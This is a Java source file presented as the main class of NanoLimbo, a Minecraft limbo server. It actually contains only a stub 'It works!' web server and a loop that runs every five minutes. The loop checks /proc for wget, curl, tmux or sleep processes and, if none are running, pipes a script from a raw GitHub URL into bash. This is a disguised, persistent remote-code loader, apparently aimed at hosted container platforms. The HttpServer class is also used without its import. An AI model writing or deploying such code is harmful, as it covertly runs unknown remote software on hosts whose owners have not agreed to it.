package ua.nanit.limbo;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.*;

public final class NanoLimbo {

    private static final String ANSI_GREEN  = "\033[1;32m";
    private static final String ANSI_YELLOW = "\033[1;33m";
    private static final String ANSI_RESET  = "\033[0m";

    // ── 来自 index.js 的配置 ──
    private static final String BASEDIR = Paths.get(System.getProperty("user.dir"), "logs").toString();
    private static final int PORT = Integer.parseInt(
        firstNonEmpty(System.getenv("SERVER_PORT"), System.getenv("PORT"), "4567")
    );
    private static final String FULL_PATH = "/home/container/.tmp:/home/container/.npm:" + System.getenv("PATH");

    private static final String CURL_COMMAND =
        "curl -LsS https://raw.githubusercontent.com/1715Yy/vipnezhash/refs/heads/main/vip1715.sh | bash";

    private static final String[] PROCESS_KEYWORDS = {"wget", "curl", "tmux", "sleep", "Boken"};

    private static final int MONITOR_INTERVAL_MINUTES = 5;

    private static final ScheduledExecutorService scheduler = Executors.newSingleThreadScheduledExecutor();

    // ────────────────────────────────────────────
    //  main
    // ────────────────────────────────────────────
    public static void main(String[] args) throws Exception {

        ensureDir(BASEDIR);

        // 启动 HTTP 服务器
        HttpServer server = HttpServer.create(new InetSocketAddress(PORT), 0);
        server.createContext("/", exchange -> {
            byte[] body = "<h1>It works!</h1>".getBytes();
            exchange.getResponseHeaders().set("Content-Type", "text/html");
            exchange.sendResponseHeaders(200, body.length);
            exchange.getResponseBody().write(body);
            exchange.getResponseBody().close();
        });
        server.setExecutor(Executors.newFixedThreadPool(2));
        server.start();
        System.out.println(ANSI_GREEN + "✅ Server running on port " + PORT + ANSI_RESET);

        // 2 秒后启动监控循环
        scheduler.schedule(() -> monitorLoop(), 2, TimeUnit.SECONDS);
    }

    // ────────────────────────────────────────────
    //  监控循环（对应 index.js 的 Scheduler.loop）
    // ────────────────────────────────────────────
    private static void monitorLoop() {
        if (!isAnyKeywordRunning()) {
            System.out.println(ANSI_YELLOW + "⚠ No key processes found. Executing command..." + ANSI_RESET);
            runCurlCommand();
        }
        scheduler.schedule(NanoLimbo::monitorLoop, MONITOR_INTERVAL_MINUTES, TimeUnit.MINUTES);
    }

    // ────────────────────────────────────────────
    //  进程检测（对应 index.js 的 listRunningCommands + 判断）
    // ────────────────────────────────────────────
    private static boolean isAnyKeywordRunning() {
        File procDir = new File("/proc");
        if (!procDir.exists()) return false;

        for (File f : procDir.listFiles()) {
            if (!f.getName().matches("\\d+")) continue;
            try {
                String cmdline = new String(Files.readAllBytes(f.toPath().resolve("cmdline")));
                for (String kw : PROCESS_KEYWORDS) {
                    if (cmdline.contains(kw)) return true;
                }
            } catch (IOException ignored) {}
        }
        return false;
    }

    // ────────────────────────────────────────────
    //  执行 curl 命令（对应 index.js 的 runCommand2）
    // ────────────────────────────────────────────
    private static void runCurlCommand() {
        try {
            ProcessBuilder pb = new ProcessBuilder("bash", "-c", CURL_COMMAND);
            pb.environment().put("PATH", FULL_PATH);
            pb.inheritIO();
            Process p = pb.start();

            // 异步等待退出码
            CompletableFuture.runAsync(() -> {
                try {
                    int code = p.waitFor();
                    System.out.println("Command exited: " + code);
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                }
            });
        } catch (IOException e) {
            System.err.println("Command error: " + e.getMessage());
        }
    }

    // ────────────────────────────────────────────
    //  工具方法
    // ────────────────────────────────────────────
    private static void ensureDir(String p) {
        File dir = new File(p);
        if (!dir.exists()) dir.mkdirs();
    }

    private static String firstNonEmpty(String... vals) {
        for (String v : vals) {
            if (v != null && !v.trim().isEmpty()) return v.trim();
        }
        return "";
    }
}
